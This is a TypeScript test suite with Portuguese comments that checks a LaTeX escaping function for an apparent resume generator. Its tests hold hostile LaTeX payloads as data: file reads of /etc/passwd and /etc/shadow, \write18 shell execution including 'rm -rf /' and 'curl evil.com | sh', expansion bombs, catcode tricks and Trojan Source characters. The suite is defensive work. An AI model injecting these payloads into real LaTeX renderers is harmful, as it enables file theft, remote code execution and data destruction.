import { describe, it, expect } from "vitest";
import { escapeLatex, escapeLatexUrl } from "../escape.js";

/**
 * SUÍTE DE ATAQUES
 *
 * Exigida pela seção 5.1 do planejamento. Roda em CI a cada PR.
 *
 * A asserção central é sempre a mesma: depois do escape, não pode restar
 * NENHUM contrabarra seguido de letra — porque é exatamente essa sequência
 * que o LaTeX interpreta como comando. Se ela sobreviver, o texto do usuário
 * virou código.
 */

/**
 * As únicas sequências com contrabarra que o escape tem permissão de emitir.
 *
 * A verificação é por subtração, e não por busca de padrão perigoso: removemos
 * da saída tudo o que o escaper legitimamente produz e exigimos que NENHUM
 * contrabarra e NENHUMA chave sobrem.
 *
 * Essa inversão importa. Procurar por `\` seguido de letra parece equivalente,
 * mas acusaria o próprio `\textbackslash{}` — e, pior, deixaria passar
 * qualquer construção perigosa que não casasse com o padrão imaginado. Por
 * subtração, o teste não depende de eu ter previsto a forma do ataque: se
 * sobrou um contrabarra na saída, ele veio do usuário, e isso basta para
 * reprovar.
 */
const SAIDAS_LEGITIMAS =
  /\\(?:textbackslash\{\}|textasciitilde\{\}|textasciicircum\{\}|[{}$&#_%])/g;

function residuo(saida: string): string {
  return saida.replace(SAIDAS_LEGITIMAS, "");
}

function verificarNeutralizado(payload: string) {
  const saida = escapeLatex(payload);
  const resto = residuo(saida);

  expect(resto).not.toContain("\\");
  expect(resto).not.toMatch(/[{}]/);
  return saida;
}

describe("leitura de arquivos do servidor", () => {
  it("neutraliza \\input", () => {
    verificarNeutralizado("\\input{/etc/passwd}");
  });

  it("neutraliza \\include e \\InputIfFileExists", () => {
    verificarNeutralizado("\\include{/etc/shadow}");
    verificarNeutralizado("\\InputIfFileExists{/etc/passwd}{}{}");
  });

  it("neutraliza \\openin / \\read, a leitura de baixo nível do TeX", () => {
    verificarNeutralizado("\\openin1=/etc/passwd \\read1 to \\x \\x");
  });

  it("neutraliza \\lstinputlisting, que também lê arquivo", () => {
    verificarNeutralizado("\\lstinputlisting{/etc/passwd}");
  });
});

describe("execução de comandos", () => {
  it("neutraliza \\write18", () => {
    verificarNeutralizado("\\write18{rm -rf /}");
  });

  it("neutraliza \\immediate\\write18", () => {
    verificarNeutralizado("\\immediate\\write18{curl evil.com | sh}");
  });

  it("neutraliza \\ShellEscape", () => {
    verificarNeutralizado("\\ShellEscape{cat /etc/passwd}");
  });
});

describe("negação de serviço", () => {
  it("neutraliza laço infinito", () => {
    verificarNeutralizado("\\loop\\iftrue\\repeat");
  });

  it("neutraliza recursão que estoura a memória", () => {
    verificarNeutralizado("\\def\\x{\\x}\\x");
  });

  it("neutraliza bomba de expansão", () => {
    verificarNeutralizado("\\def\\a{aaaaaaaaaa}\\def\\b{\\a\\a\\a\\a\\a\\a}\\b");
  });

  it("aguenta entrada muito grande sem travar", () => {
    // O teto de 5.000 caracteres do schema já barra isto antes; aqui
    // garantimos que a função em si não é o gargalo.
    const gigante = "\\input{x}".repeat(200_000);
    const inicio = Date.now();
    const saida = escapeLatex(gigante);
    expect(Date.now() - inicio).toBeLessThan(3000);
    expect(residuo(saida)).not.toContain("\\");
  });
});

describe("alteração de catcode e redefinição", () => {
  it("neutraliza \\catcode, que reclassifica caracteres", () => {
    // O ataque mais perverso: transformar outro caractere em contrabarra,
    // escapando de qualquer escape baseado em lista de caracteres.
    verificarNeutralizado("\\catcode`\\@=0 @input{/etc/passwd}");
  });

  it("neutraliza \\makeatletter", () => {
    verificarNeutralizado("\\makeatletter\\@@input /etc/passwd");
  });

  it("neutraliza redefinição de comando do próprio template", () => {
    verificarNeutralizado("\\renewcommand{\\cvNome}[1]{COMPROMETIDO}");
  });
});

describe("fuga do contexto do comando", () => {
  it("neutraliza fechamento prematuro de argumento", () => {
    // Não injeta comando novo: apenas fecha \cvItem{...} antes da hora.
    verificarNeutralizado("Acme} \\cvSecao{Injetado");
  });

  it("neutraliza chave de fechamento solta", () => {
    verificarNeutralizado("}");
    verificarNeutralizado("{");
  });

  it("neutraliza comentário que engoliria o resto da linha", () => {
    // Sem escape, o % comentaria o fechamento da macro no template.
    const saida = escapeLatex("Desenvolvedor 100% dedicado");
    expect(saida).toBe("Desenvolvedor 100\\% dedicado");
  });

  it("neutraliza entrada em modo matemático", () => {
    verificarNeutralizado("$x$ \\input{/etc/passwd} $y$");
    verificarNeutralizado("$$\\input{/etc/passwd}$$");
  });

  it("neutraliza # de parâmetro de macro", () => {
    expect(escapeLatex("C# e F#")).toBe("C\\# e F\\#");
  });
});

describe("caracteres invisíveis", () => {
  it("remove zero-width, que esconde conteúdo", () => {
    expect(escapeLatex("Ana\u200BMaria")).toBe("AnaMaria");
    expect(escapeLatex("\uFEFFAna")).toBe("Ana");
  });

  it("remove controles de direção (ataque Trojan Source)", () => {
    // Sem a remoção, o texto exibido teria ordem diferente do armazenado:
    // o usuário veria uma coisa e o PDF conteria outra.
    const saida = escapeLatex("Gerente\u202Eoãçerid ed\u202C");
    expect(saida).not.toContain("\u202E");
    expect(saida).not.toContain("\u202C");
  });

  it("remove controles C0 que abortam o Tectonic", () => {
    expect(escapeLatex("Ana\u0000Maria")).toBe("AnaMaria");
    expect(escapeLatex("Ana\u001BMaria")).toBe("AnaMaria");
  });

  it("preserva tabulação e quebra de linha, que são conteúdo legítimo", () => {
    expect(escapeLatex("linha1\nlinha2")).toBe("linha1\nlinha2");
  });
});

describe("escapeLatexUrl", () => {
  /**
   * Aqui a verificação é ainda mais simples que a do texto: a saída é
   * percent-encoded, então não há escape legítimo com contrabarra. Nenhum
   * contrabarra e nenhuma chave podem existir, ponto.
   */
  function verificarUrlSegura(saida: string) {
    expect(saida).not.toContain("\\");
    expect(saida).not.toMatch(/[{}]/);
  }

  it("percent-encoda caracteres que quebram o argumento do \\href", () => {
    const saida = escapeLatexUrl("https://exemplo.com/a%b#c");
    verificarUrlSegura(saida);
    expect(saida).not.toContain("#");
    // O % da entrada vira %25; o # vira %23.
    expect(saida).toContain("%25");
    expect(saida).toContain("%23");
  });

  it("neutraliza tentativa de sair do argumento da URL", () => {
    verificarUrlSegura(escapeLatexUrl("https://e.com/}{\\input{/etc/passwd}"));
  });

  it("preserva URLs normais de perfil", () => {
    expect(escapeLatexUrl("https://github.com/tmvinicius")).toBe(
      "https://github.com/tmvinicius",
    );
    // Sublinhado é comum em usuário e vira %5F — a URL continua válida.
    expect(escapeLatexUrl("https://github.com/foo_bar")).toBe(
      "https://github.com/foo%5Fbar",
    );
  });
});
